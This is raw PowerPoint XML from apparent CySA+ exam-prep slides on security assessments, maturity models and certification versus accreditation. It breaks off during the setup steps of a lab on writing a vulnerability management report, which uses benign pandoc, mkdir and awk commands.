                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Red team assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Risk assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Threat modeling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tabletop exercises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861</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Evaluations &amp; Assessments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Vulnerability assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Gather exhaustive info on vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Remediated vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Vulnerability trends on the network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Penetration test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Achieves a specific goal – get into the system, steal, or exfiltrate data</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862</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Evaluations &amp; Assessments (3)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Red team assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Pen testing is a discreet part</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Red teaming is ongoing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Actively probing &amp; testing to reveal vulnerabilities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863</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Evaluations &amp; Assessments (4)</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Vulnerability assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Penetration test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Red team assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Risk assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Acceptable risk level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How to bring risk level down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Threat modeling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Determine attacker trends</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make security changes accordingly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Accurately informs about threats &amp; how to place countermeasures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864</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Evaluations &amp; Assessments (5)</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Tabletop exercises</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Get senior &amp; technical leaders involved</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Everyone knows their role in an emergency</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865</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Maturity Models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A maturity model is a framework for measuring how developed and repeatable an organization's processes are, ranking them along defined levels so improvement can be tracked over time rather than judged subjectively.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The Capability Maturity Model Integration (CMMI), developed at Carnegie Mellon University, is the classic example, rating process maturity across levels from Initial (ad hoc and unpredictable), through Managed, Defined, and Quantitatively Managed, to Optimizing (continuously improving), and similar models exist specifically for security programs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts and their leadership use maturity models in reporting to benchmark the security program, set improvement targets, and justify investment by showing progression from one level to the next.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CySA+ references CMMI as a way to gauge and communicate program maturity, so recognize it as a benchmarking tool and understand that higher levels mean more defined, measured, and continuously improving processes.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866</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Maturity Models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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Capability Maturity Model Integration (CMMI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Developed by Carnegie Mellon University to improve processes across organization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_e0da1ae05e.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2073623"/>
            <a:ext cx="4937760" cy="3716593"/>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867</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Certification &amp; Accreditation —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Certification is the formal technical evaluation of a system or component to confirm that its security controls are correctly implemented and meet a defined baseline, whether that baseline is an internal organizational standard or an external regulatory requirement such as FISMA, PCI DSS, or a framework like NIST SP 800-53. It is a hands-on, evidence-based process in which assessors test and document how well the technical safeguards actually perform against the required criteria before the system is trusted for production use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Accreditation, by contrast, is the managerial decision in which a senior authorizing official reviews the certification results and formally accepts the system, along with any residual risk, for operation in a specific environment. Where certification answers the technical question of whether the controls work, accreditation answers the business question of whether the organization is willing to accept the remaining risk given its mission and business model, and it is this sign-off that grants the authorization to operate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC or security analyst, certification and accreditation define which systems are approved to run and under what conditions, so findings, vulnerabilities, and control gaps you report can jeopardize a system's authorization and must be communicated clearly to the authorizing official. Understanding the split also clarifies escalation: technical remediation and evidence flow up through certification, while acceptance of residual risk is a management responsibility you inform but do not own.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: On the CySA+ exam, expect questions that ask you to distinguish certification (the technical assessment of controls) from accreditation (management's formal risk acceptance and authorization to operate), often in the context of reporting findings to stakeholders and supporting the authorization decision.</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868</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · VERIFICATION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Certification &amp; Accreditation — Key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Certification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Technical assessment of a component to assure it’s ready for a system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Checked against internal standard, or outside regulatory requirement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Accreditation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Managerial assessment &amp; acceptance of a component</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Verified against business model</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869</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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TOPIC 4 · PRACTICE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Hands-On: Labs 26–30</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5 step-by-step labs applying Reporting and Communication in the Killercoda playground and free tools.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870</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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26 — Vulnerability Management Report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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will turn raw OpenVAS / Nmap output into a stakeholder-ready vulnerability report with a risk score, affected hosts, mitigations, and an action plan. This maps to CySA+ 4.1 (Vulnerability management reporting — Vulnerabilities, Affected hosts, Risk score, Mitigation, Recurrence, Prioritization;…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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871</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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26 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install report tooling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>pandoc converts Markdown → PDF / HTML / DOCX with one command.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y pandoc texlive-latex-base texlive-fonts-rec</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Seed input data (pretend it came from OpenVAS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The columns map directly to CySA+ 4.1's bullet list: Vulnerabilities, Affected hosts, Risk score, Recurrence.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/lab26 &amp;&amp; cd /tmp/lab26</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Compute the prioritisation column</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Prioritisation logic mirrors CySA+ 2.3 + 4.1: KEV catalog hits and CVSS ≥ 9 are always P1.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ awk -F, 'NR==1 {print $0",Priority"; next}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
